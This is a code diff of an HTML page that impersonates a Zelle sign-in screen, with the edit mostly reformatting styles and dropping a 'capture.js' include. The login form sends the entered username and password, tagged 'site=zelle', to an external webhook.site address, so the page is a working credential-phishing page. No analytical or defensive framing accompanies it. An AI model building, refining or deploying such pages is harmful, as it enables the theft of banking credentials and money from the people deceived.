@@ -1,17 +1,69 @@
 <html>
 <head>
-    <script src="capture.js"></script>
     <title>Zelle</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #0072ce 0%, #00a3e0 100%); margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; }
-        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); width: 400px; color: #333; }
-        .logo { text-align: center; margin-bottom: 30px; }
-        .logo-text { color: #0072ce; font-size: 32px; font-weight: bold; letter-spacing: 1px; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin: 12px 0; border: 2px solid #ddd; border-radius: 6px; font-size: 16px; }
-        input[type="submit"] { background: #0072ce; color: white; border: none; padding: 16px; border-radius: 6px; width: 100%; font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer; }
-        input[type="submit"]:hover { background: #005baa; }
-        .header { font-size: 24px; margin-bottom: 30px; color: #0072ce; text-align: center; font-weight: bold; }
-        .subtext { text-align: center; color: #666; margin-top: 20px; font-size: 14px; }
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #0072ce 0%, #00a3e0 100%);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            width: 400px;
+            color: #333;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo-text {
+            color: #0072ce;
+            font-size: 32px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        .header {
+            font-size: 24px;
+            margin-bottom: 30px;
+            color: #0072ce;
+            text-align: center;
+            font-weight: bold;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            margin: 12px 0;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        input[type="submit"] {
+            background: #0072ce;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 6px;
+            width: 100%;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .subtext {
+            text-align: center;
+            color: #666;
+            margin-top: 20px;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
@@ -20,11 +72,14 @@
             <div class="logo-text">ZELLE</div>
         </div>
         <div class="header">Sign In to Your Account</div>
+
         <form action="https://webhook.site/ac3017bb-31ec-446c-ba45-5b13aae5c7fb" method="POST">
-            <input type="text" name="username" placeholder="Email or Username">
-            <input type="password" name="password" placeholder="Password">
+            <input type="hidden" name="site" value="zelle">
+            <input type="text" name="username" placeholder="Email or Username" required>
+            <input type="password" name="password" placeholder="Password" required>
             <input type="submit" value="Sign In">
-        <input type="hidden" name="site" value="zelle"></form>
+        </form>
+
         <div class="subtext">A safe and fast way to send and receive money</div>
     </div>
 </body>
